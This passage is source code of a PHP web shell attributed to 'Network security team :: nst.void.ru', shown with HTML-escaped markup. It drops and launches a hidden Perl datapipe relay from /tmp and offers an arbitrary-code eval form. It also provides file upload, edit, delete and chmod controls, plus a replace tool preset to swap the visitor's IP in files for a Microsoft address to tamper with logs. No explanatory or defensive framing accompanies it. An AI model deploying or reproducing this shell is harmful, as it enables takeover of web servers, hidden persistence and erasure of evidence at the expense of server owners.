                        my \$res = syswrite(\$th, \$tbuffer, \$len);
                        print \"Child: Äàííûå îòïðàâëåíû.\n\" if \$log;
                        if (\$res &gt; 0) {
                                \$tbuffer = substr(\$tbuffer, \$res);
                        } else {
                                print STDERR \"Child: Íåâîçìîæíî îòïðàâèòü äàííûå: \$!\n\";
                        }
                }

                while (my \$len = length(\$cbuffer)) {
                        print \"Child: Îòïðàâëÿåì \$len áàéò êëèåíòó.\n\" if \$log;
                        my \$res = syswrite(\$ch, \$cbuffer, \$len);
                        print \"Child: Äàííûå îòïðàâëåíû..\n\" if \$log;
                        if (\$res &gt; 0) {
                                \$cbuffer = substr(\$cbuffer, \$res);
                        } else {
                                print STDERR \"Child: Íåâîçìîæíî îòïðàâèòü äàííûå: \$!\n\";
                        }
                }
        }
}

";

if(is_writable("/tmp")){
$fp=fopen("/tmp/nst_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl /tmp/nst_perl_datapipe.pl &");
unlink("/tmp/nst_perl_datapipe.pl");
}else{
if(is_writable(".")){
mkdir(".nst_datapipe_tmp");
$fp=fopen(".nst_datapipe_tmp/nst_perl_datapipe.pl","w");
fwrite($fp,"$datapipe_pl");
passthru("nohup perl .nst_datapipe_tmp/nst_perl_datapipe.pl &");
unlink(".nst_datapipe_tmp/nst_perl_datapipe.pl");
rmdir(".nst_datapipe_tmp");
}
}
$show_ps="1";

}#end of datapipe perl





if($show_ps=="1"){
print "&lt;center&gt;&lt;b&gt;1&lt;/b&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;";
print "&lt;pre&gt;";
passthru("ps ux");
print "&lt;/pre&gt;&lt;br&gt;&lt;br&gt;";
}



echo "&lt;form method=post&gt;&lt;b&gt;md5:&lt;/b&gt;&lt;br&gt;&lt;input name=md5 size=30&gt;
&lt;Br&gt;
md5 online encoder/decoder (brutforce) (php) - [&lt;a href=http://nst.void.ru/?q=releases&download=4&gt;DOWNLOAD&lt;/a&gt;]
&lt;/form&gt;
";
@$md5=@$_POST['md5'];
if(@$_POST['md5']){ echo "md5:&lt;br&gt;&lt;textarea rows=1 cols=113&gt;".md5($md5)."&lt;/textarea&gt;";}
echo "&lt;br&gt;
&lt;form method=post&gt;&lt;b&gt;base64 e/d:&lt;/b&gt;&lt;br&gt;&lt;input name=base64 size=30&gt;&lt;/form&gt;&lt;br&gt;";
if(@$_POST['base64']){
@$base64=$_POST['base64'];
echo "
&lt;b&gt;Encode: &lt;br&gt;&lt;textarea rows=15 cols=113&gt;".base64_encode($base64)."&lt;/textarea&gt;&lt;br&gt;
Decode:&lt;/b&gt; &lt;br&gt;&lt;textarea rows=15 cols=113&gt;".base64_decode($base64)."&lt;/textarea&gt;&lt;br&gt;";}
echo "&lt;br&gt;
&lt;form method=post&gt;&lt;b&gt;DES:&lt;/b&gt;&lt;br&gt;&lt;input name=des size=30&gt;&lt;br&gt;
John The Ripper [&lt;a href=http://www.openwall.com/john/ target=_blank&gt;Web&lt;/a&gt;]&lt;/form&gt;&lt;br&gt;";
if(@$_POST['des']){
@$des=@$_POST['des'];
echo "&lt;b&gt;Des:&lt;/b&gt; &lt;br&gt;&lt;textarea rows=15 cols=113&gt;".crypt($des)."&lt;/textarea&gt;";}

print "
&lt;b&gt;eval:&lt;/b&lt;br&gt;
(example: print \"Hello World\";)
&lt;form method=post&gt;
&lt;font color=red&gt;&lt;b&gt;<?&lt;/b&gt;&lt;br&gt;
&lt;textarea name=eval rows=15 cols=113&gt;&lt;/textarea&gt;&lt;br&gt;
&lt;b&gt;?>&lt;/b&gt;&lt;/font&gt;&lt;br&gt;
&lt;input type=submit value=Run style='width:150px;'&gt;
&lt;/form&gt;&lt;br&gt;
";

function eval_sl($editf){
if(get_magic_quotes_gpc()==1){
$editf=stripslashes($editf);
}
return $editf;
}


if($_POST['eval']){
print "&lt;b&gt;RESULT:&lt;br&gt;&lt;br&gt;&lt;/b&gt;";
eval(eval_sl($_POST['eval']));
print "&lt;br&gt;&lt;br&gt;";

print "&lt;font color=green&gt;&lt;b&gt;PHP:&lt;/b&gt;&lt;br&gt;\r\n\r\n";
print "<?\r\n";
print "&lt;br&gt;";
print htmlspecialchars(eval_sl(($_POST['eval'])));
print "&lt;br&gt;";
print "?>\r\n\r\n&lt;/font&gt;&lt;br&gt;&lt;br&gt;";

}

echo $copyr;
exit;}

if(@$_GET['replace']=="1"){
$ip=@$_SERVER['REMOTE_ADDR'];
$d=$_GET['d'];
$e=$_GET['e'];
@$de=$d."/".$e;
$de=str_replace("//","/",$de);
$e=@$e;
echo "[&lt;a href='$php_self?d=$d&del_f=1&wich_f=$e'&gt;Delete&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ef=$e&edit=1'&gt;Edit&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&clean=1'&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&replace=1'&gt;Replace text in file&lt;/a&gt;] [&lt;a href='$php_self?d=$d&download=$e'&gt;Download&lt;/a&gt;] [&lt;a href='$php_self?d=$d&rename=1&wich_f=$e'&gt;Rename&lt;/a&gt;] [&lt;a href='$php_self?d=$d&chmod=1&wich_f=$e'&gt;CHMOD&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ccopy_to=$e'&gt;Copy&lt;/a&gt;]&lt;br&gt;";
echo "
Replace tool:&lt;br&gt;
(You can replace any text)&lt;br&gt;
File: $de&lt;br&gt;
&lt;form method=post&gt;
1. Your ip.&lt;br&gt;
2. microsoft.com ip :)&lt;br&gt;
Replace this &lt;input name=thisX size=30 value=$ip&gt; by this &lt;input name=bythis size=30 value=207.46.245.156&gt;
&lt;input type=submit name=doit value=Replace&gt;
&lt;/form&gt;
";

if(@$_POST['doit']){
@$thisX=$_POST['thisX'];
@$bythis=$_POST['bythis'];
@$e=$_GET['e'];
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$rpl = @fread ($fd, @filesize ($filename));
$re=str_replace("$thisX","$bythis",$rpl);
$x=@fopen("$d/$e","w");
@fwrite($x,"$re");
echo "&lt;br&gt;&lt;center&gt;$thisX Replaced by $bythis&lt;br&gt;
[&lt;a href='$php_self?d=$d&e=$e'&gt;VIew file&lt;/a&gt;]&lt;br&gt;&lt;br&gt;&lt;Br&gt;";

}
echo $copyr;
exit;}


if(@$_GET['t']=="upload"){
echo "&lt;br&gt;
&lt;a href='$php_self?d=$d&t=massupload'&gt;* Mass upload *&lt;/a&gt;&lt;br&gt;
File upload:&lt;br&gt;
&lt;form enctype=\"multipart/form-data\" method=post&gt;
&lt;input type=file name=text size=50&gt;&lt;br&gt;
&lt;input name=where size=52 value='$d'&gt;&lt;br&gt;
New file name:&lt;br&gt;
&lt;input name=newf size=30 autocomplete=off&gt; (if empty, it will be default)&lt;br&gt;
&lt;input type=submit value=Upload name=uploadf&gt;
&lt;/form&gt;&lt;br&gt;
";

if(@$_POST['uploadf']){
$where=$_POST['where'];
$newf=$_POST['newf'];
$where=str_replace("//","/",$where);
if($newf==""){$newf=$_FILES['text']['name'];}else{$newf=$newf;}
$uploadfile = "$where/".$newf;
if (@move_uploaded_file(@$_FILES['text']['tmp_name'], $uploadfile)) {
$uploadfile=str_replace("//","/",$uploadfile);
echo "&lt;i&gt;&lt;br&gt;Uploaded to $uploadfile&lt;/i&gt;&lt;br&gt;";
}else{
echo "&lt;i&gt;&lt;br&gt;Error&lt;/i&gt;&lt;br&gt;";}
}
}

if(@$_GET['t']=="massupload"){
echo "
Mass upload:&lt;br&gt;
&lt;form enctype=\"multipart/form-data\" method=post&gt;
&lt;input type=file name=text1 size=43&gt; &lt;input type=file name=text11 size=43&gt;&lt;br&gt;
&lt;input type=file name=text2 size=43&gt; &lt;input type=file name=text12 size=43&gt;&lt;br&gt;
&lt;input type=file name=text3 size=43&gt; &lt;input type=file name=text13 size=43&gt;&lt;br&gt;
&lt;input type=file name=text4 size=43&gt; &lt;input type=file name=text14 size=43&gt;&lt;br&gt;
&lt;input type=file name=text5 size=43&gt; &lt;input type=file name=text15 size=43&gt;&lt;br&gt;
&lt;input type=file name=text6 size=43&gt; &lt;input type=file name=text16 size=43&gt;&lt;br&gt;
&lt;input type=file name=text7 size=43&gt; &lt;input type=file name=text17 size=43&gt;&lt;br&gt;
&lt;input type=file name=text8 size=43&gt; &lt;input type=file name=text18 size=43&gt;&lt;br&gt;
&lt;input type=file name=text9 size=43&gt; &lt;input type=file name=text19 size=43&gt;&lt;br&gt;
&lt;input type=file name=text10 size=43&gt; &lt;input type=file name=text20 size=43&gt;&lt;br&gt;
&lt;input name=where size=43 value='$d'&gt;&lt;br&gt;
&lt;input type=submit value=Upload name=massupload&gt;
&lt;/form&gt;&lt;br&gt;";

if(@$_POST['massupload']){
$where=@$_POST['where'];
$uploadfile1 = "$where/".@$_FILES['text1']['name'];
$uploadfile2 = "$where/".@$_FILES['text2']['name'];
$uploadfile3 = "$where/".@$_FILES['text3']['name'];
$uploadfile4 = "$where/".@$_FILES['text4']['name'];
$uploadfile5 = "$where/".@$_FILES['text5']['name'];
$uploadfile6 = "$where/".@$_FILES['text6']['name'];
$uploadfile7 = "$where/".@$_FILES['text7']['name'];
$uploadfile8 = "$where/".@$_FILES['text8']['name'];
$uploadfile9 = "$where/".@$_FILES['text9']['name'];
$uploadfile10 = "$where/".@$_FILES['text10']['name'];
$uploadfile11 = "$where/".@$_FILES['text11']['name'];
$uploadfile12 = "$where/".@$_FILES['text12']['name'];
$uploadfile13 = "$where/".@$_FILES['text13']['name'];
$uploadfile14 = "$where/".@$_FILES['text14']['name'];
$uploadfile15 = "$where/".@$_FILES['text15']['name'];
$uploadfile16 = "$where/".@$_FILES['text16']['name'];
$uploadfile17 = "$where/".@$_FILES['text17']['name'];
$uploadfile18 = "$where/".@$_FILES['text18']['name'];
$uploadfile19 = "$where/".@$_FILES['text19']['name'];
$uploadfile20 = "$where/".@$_FILES['text20']['name'];
if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile1&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile2&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile3&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile4&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile5&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile6&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile7&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile8&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile9&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile10&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile11&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile12&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile13&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile14&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile15&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile16&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile17&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile18&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile19&lt;/i&gt;&lt;br&gt;";}
if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {
$where=str_replace("\\\\","\\",$where);
echo "&lt;i&gt;Uploaded to $uploadfile20&lt;/i&gt;&lt;br&gt;";}
}
echo $copyr;
exit;}

if(@$_GET['yes']=="yes"){
$d=@$_GET['d']; $e=@$_GET['e'];
unlink($d."/".$e);
$delresult="Success $d/$e deleted &lt;meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?d=$d\"&gt;";
}
if(@$_GET['clean']=="1"){
@$e=$_GET['e'];
$x=fopen("$d/$e","w");
fwrite($x,"");
echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=".@$e."\"&gt;";
exit;
}


if(@$_GET['e']){
$d=@$_GET['d'];
$e=@$_GET['e'];
$pinf=pathinfo($e);
if(in_array(".".@$pinf['extension'],$images)){
echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e&img=1\"&gt;";
exit;}
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$e;
$de=str_replace("//","/",$de);
if(is_file($de)){
if(!is_writable($de)){echo "&lt;font color=red&gt;READ ONLY&lt;/font&gt;&lt;br&gt;";}}
echo "[&lt;a href='$php_self?d=$d&del_f=1&wich_f=$e'&gt;Delete&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ef=$e&edit=1'&gt;Edit&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&clean=1'&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&replace=1'&gt;Replace text in file&lt;/a&gt;] [&lt;a href='$php_self?d=$d&download=$e'&gt;Download&lt;/a&gt;] [&lt;a href='$php_self?d=$d&rename=1&wich_f=$e'&gt;Rename&lt;/a&gt;] [&lt;a href='$php_self?d=$d&chmod=1&wich_f=$e'&gt;CHMOD&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ccopy_to=$e'&gt;Copy&lt;/a&gt;]&lt;br&gt;";
echo "
File contents:&lt;br&gt;
$de
&lt;br&gt;
&lt;table width=100% border=1 cellpadding=0 cellspacing=0&gt;
&lt;tr&gt;&lt;td&gt;&lt;pre&gt;
$c

&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;

";

if(@$_GET['delete']=="1"){
$delete=$_GET['delete'];
echo "
DELETE: Are you sure?&lt;br&gt;
&lt;a href=\"$php_self?d=$d&e=$e&delete=".@$delete."&yes=yes\"&gt;Yes&lt;/a&gt; || &lt;a href='$php_self?no=1'&gt;No&lt;/a&gt;
&lt;br&gt;
";
if(@$_GET['yes']=="yes"){
@$d=$_GET['d']; @$e=$_GET['e'];
echo $delresult;
}
if(@$_GET['no']){
echo "&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$e\"&gt;
";
}


} #end of delete
echo $copyr;
exit;
} #end of e

if(@$_GET['edit']=="1"){
@$d=$_GET['d'];
@$ef=$_GET['ef'];
$e=$ef;
if(is_file($d."/".$ef)){
if(!is_writable($d."/".$ef)){echo "&lt;font color=red&gt;READ ONLY&lt;/font&gt;&lt;br&gt;";}}
echo "[&lt;a href='$php_self?d=$d&del_f=1&wich_f=$e'&gt;Delete&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ef=$e&edit=1'&gt;Edit&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&clean=1'&gt;Filesize to 0 byte&lt;/a&gt;] [&lt;a href='$php_self?d=$d&e=$e&replace=1'&gt;Replace text in file&lt;/a&gt;] [&lt;a href='$php_self?d=$d&download=$e'&gt;Download&lt;/a&gt;] [&lt;a href='$php_self?d=$d&rename=1&wich_f=$e'&gt;Rename&lt;/a&gt;] [&lt;a href='$php_self?d=$d&chmod=1&wich_f=$e'&gt;CHMOD&lt;/a&gt;] [&lt;a href='$php_self?d=$d&ccopy_to=$e'&gt;Copy&lt;/a&gt;]&lt;br&gt;";
$filename="$d/$ef";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$ef;
$de=str_replace("//","/",$de);
echo "
Edit:&lt;br&gt;
$de&lt;br&gt;";

if(!@$_POST['save']){
print "
&lt;form method=post&gt;
&lt;input name=filename value='$d/$ef'&gt;
&lt;textarea cols=143 rows=30 name=editf&gt;$c&lt;/textarea&gt;
&lt;br&gt;
&lt;input type=submit name=save value='Save changes'&gt;&lt;/form&gt;&lt;br&gt;
";
}
if(@$_POST['save']){
$editf=@$_POST['editf'];

if(get_magic_quotes_runtime() or get_magic_quotes_gpc()){
$editf=stripslashes($editf);
}

$f=fopen($filename,"w+");
fwrite($f,"$editf");
echo "&lt;br&gt;
&lt;b&gt;File edited.&lt;/b&gt;
&lt;meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?d=$d&e=$ef\"&gt;";
exit;
}
echo $copyr;
exit;
}



echo"
&lt;table width=100% cellpadding=1 cellspacing=0 class=hack&gt;
&lt;tr&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Filename&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Tools&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;b&gt;Size&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;center&gt;&lt;b&gt;Owner/Group&lt;/b&gt;&lt;/td&gt;&lt;td bgcolor=#519A00&gt;&lt;b&gt;Perms&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;
";
$dirs=array();
$files=array();
$dh = @opendir($d) or die("&lt;table width=100%&gt;&lt;tr&gt;&lt;td&gt;&lt;center&gt;Permission Denied or Folder/Disk does not exist&lt;/center&gt;&lt;br&gt;$copyr&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;");
while (!(($file = readdir($dh)) === false)) {
if ($file=="." || $file=="..") continue;
if (@is_dir("$d/$file")) {
      $dirs[]=$file;
}else{
      $files[]=$file;
      }
   sort($dirs);
   sort($files);

$fz=@filesize("$d/$file");
}

function perm($perms){
if (($perms & 0xC000) == 0xC000) {
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   $info = 'p';
} else {
   $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));
return $info;
}


for($i=0; $i&lt;count($dirs); $i++){

$perms = @fileperms($d."/".$dirs[$i]);
$owner = @fileowner($d."/".$dirs[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$dirs[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#D7FFA8";}else{$color="#D1D1D1";}
$linkd="&lt;a href='$php_self?d=$d/$dirs[$i]'&gt;$dirs[$i]&lt;/a&gt;";
$linkd=str_replace("//","/",$linkd);
echo "&lt;tr&gt;&lt;td bgcolor=$color&gt;&lt;font face=wingdings size=2&gt;0&lt;/font&gt; $linkd&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;&lt;font color=blue&gt;DIR&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=$color&gt;&nbsp;&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;$owner/$group&lt;/td&gt;&lt;td bgcolor=$color&gt;$info&lt;/td&gt;&lt;/tr&gt;";
}

for($i=0; $i&lt;count($files); $i++){

$size=@filesize($d."/".$files[$i]);
$perms = @fileperms($d."/".$files[$i]);
$owner = @fileowner($d."/".$files[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$files[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#D1D1D1";}else{$color="#D7FFA8";}

if ($size &lt; 1024){$siz=$size.' b';
}else{
if ($size &lt; 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
if ($size &lt; 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
if ($size &lt; 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
}}}
echo "&lt;tr&gt;&lt;td bgcolor=$color&gt;&lt;font face=wingdings size=3&gt;2&lt;/font&gt; &lt;a href='$php_self?d=$d&e=$files[$i]'&gt;$files[$i]&lt;/a&gt;&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;&lt;a href=\"javascript:ShowOrHide('$i','')\"&gt;[options]&lt;/a&gt;&lt;div id='$i' style='display:none;z-index:1;' &gt;&lt;a href='$php_self?d=$d&ef=$files[$i]&edit=1' title='Edit $files[$i]'&gt;&lt;b&gt;Edit&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&del_f=1&wich_f=$files[$i]' title='Delete $files[$i]'&gt;&lt;b&gt;Delete&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&chmod=1&wich_f=$files[$i]' title='chmod $files[$i]'&gt;&lt;b&gt;CHMOD&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&rename=1&wich_f=$files[$i]' title='Rename $files[$i]'&gt;&lt;b&gt;Rename&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&download=$files[$i]' title='Download $files[$i]'&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href='$php_self?d=$d&ccopy_to=$files[$i]' title='Copy $files[$i] to?'&gt;&lt;b&gt;Copy&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;&lt;td bgcolor=$color&gt;$siz&lt;/td&gt;&lt;td bgcolor=$color&gt;&lt;center&gt;$owner/$group&lt;/td&gt;&lt;td bgcolor=$color&gt;$info&lt;/td&gt;&lt;/tr&gt;";
}

echo "&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
echo $copyr;

?>
&lt;!-- Network security team :: nst.void.ru --&gt;
{% endhighlight %}